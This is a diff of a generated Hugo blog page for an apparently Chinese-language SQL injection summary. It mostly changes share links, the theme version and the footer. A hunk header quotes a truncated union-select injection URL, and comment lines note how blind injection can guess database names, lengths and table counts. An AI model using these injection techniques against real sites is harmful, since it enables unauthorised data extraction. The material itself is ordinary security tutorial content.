 </span></span><span class="line"><span class="cl"><span class="c1">## 页面有不同的响应word1,word2</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## 可猜解数据库长度、个数、名字、表个数、表长度、名字、字段、</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## 长度:length，order by</span>
@@ -560,9 +583,9 @@ http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(concat_ws(&#39;~&#39;,
           </div></div><div class="post-info-line">
         <div class="post-info-md"></div>
         <div class="post-info-share">
-          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" data-title="SQL注入小结" data-hashtags="WEB"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" data-hashtag="WEB"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" data-title="SQL注入小结"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" data-title="SQL注入小结" data-hashtags="WEB"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" data-hashtag="WEB"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" data-title="SQL注入小结"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
   </span>
         </div>
       </div></div>
@@ -581,14 +604,14 @@ http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(concat_ws(&#39;~&#39;,
 
   <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
       <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
-    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.8-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
         </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
             <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
-              <a href="/"></a></span></div></div>
+              <a href="/">Ghostasky</a></span></div></div>
   </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
         </div></div><div id="mask"></div><noscript>
-    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
   </noscript>
 </div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
-    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.8-RC"};</script><script src="/js/theme.min.js" defer></script></body>
 </html>
